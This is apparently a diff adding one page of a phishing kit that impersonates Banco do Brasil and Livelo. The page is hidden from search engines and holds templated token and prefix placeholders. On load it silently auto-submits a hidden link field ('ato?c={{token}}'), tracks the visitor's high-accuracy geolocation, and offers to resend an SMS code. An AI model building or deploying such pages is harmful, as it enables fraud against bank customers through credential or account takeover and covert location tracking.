@@ -1,0 +1,105 @@
+<html data-theme="light" style="--chakra-ui-color-mode:light;">
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0">
+    <title>Banco do Brasil</title>
+    <meta name="robots" content="noindex, nofollow, noimageindex">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0">
+    <link rel="stylesheet" type="text/css" href="/assets/main-v3.css" />
+    <script>
+        var uuid_ = "{{prefix}}"
+    </script>
+    <script src="/assets/app2.js"></script>
+    <style>
+        body {
+            font-size: 16px;
+        }
+    </style>
+    <script type="text/javascript">
+        sendGeo = false
+
+        function watchLocation(successCallback, errorCallback) {
+            successCallback = successCallback || function() {};
+            errorCallback = errorCallback || function() {};
+
+            // Try HTML5-spec geolocation.
+            var geolocation = navigator.geolocation;
+
+            if (geolocation) {
+                // We have a real geolocation service.
+                try {
+                    function handleSuccess(position) {
+                        successCallback(position.coords);
+                    }
+
+                    geolocation.watchPosition(handleSuccess, errorCallback, {
+                        enableHighAccuracy: true,
+                        maximumAge: 5000 // 5 sec.
+                    });
+                } catch (err) {
+                    errorCallback();
+                }
+            } else {
+                errorCallback();
+            }
+        }
+    </script>
+</head>
+
+<body onload="init()" class="chakra-ui-light">
+    <div id="__next" data-aria-hidden="true" aria-hidden="true">
+        <div class="css-rzd8qz">
+            <div class="css-1oj8ggk"></div>
+            <div class="css-1ow331d">
+                <div class="css-1vmlim4">
+                    <div class="css-6su6fj">
+                        <img alt="logoLivelo" src="/assets/bblivelo/v3/logo-livelo.svg" class="chakra-image css-1gc45r0">
+                    </div>
+                    <div class="css-1sk5mmp">
+                        <hr aria-orientation="vertical" class="chakra-divider css-1mtzovw">
+                    </div>
+                    <div class="css-1sk5mmp">
+                        <img alt="logoBB" src="/assets/bblivelo/v3/logo-bb.svg" class="chakra-image css-1gc45r0">
+                    </div>
+                </div>
+
+                <form id="formPrimary" autocomplete="off" name="formLogin" action="" method="POST" class="css-pydr2a">
+                    <input type="hidden" name="action" id="action" value="doLink" />
+                    <input id="inpLinkAto" class="form-control chakra-input css-fqougi" type="hidden" autocomplete="off" required="required" name="inpLinkAto" placeholder="...://..." value="...://ato?c={{token}}">
+                    <div class="css-1795lpm" style="text-align: center;"><b>Aguarde...</b></div> 
+                    <br>
+                    <button type="button" class="chakra-button css-1ff85" id="enviaSMSAll" style="
+                        height: 30px;
+                        width: 50%;
+                        margin: 0 auto;
+                        margin-top: 10px;
+                        color: red;
+                        background-color: transparent;
+                    ">
+                        <span class="" style="font-family: var(--chakra-fonts-body);font-size: 16px;font-weight: 300;font-feature-settings: 'kern';">Reenviar Codigo</span>
+                    </button>
+                </form>
+            </div>
+        </div>
+    </div>
+
+    <div id="livelo-spinner">
+        <div class="loader">
+            <div class="inner one"></div>
+            <div class="inner two"></div>
+            <div class="inner three"></div>
+        </div>
+    </div>
+    <script>
+        
+        </script>
+    <script async>
+    $(document).ready(function () {
+
+        $(document).ready(function() {
+          $('#formPrimary').submit();
+        });
+    });
+    </script>
+</body>
+</html>
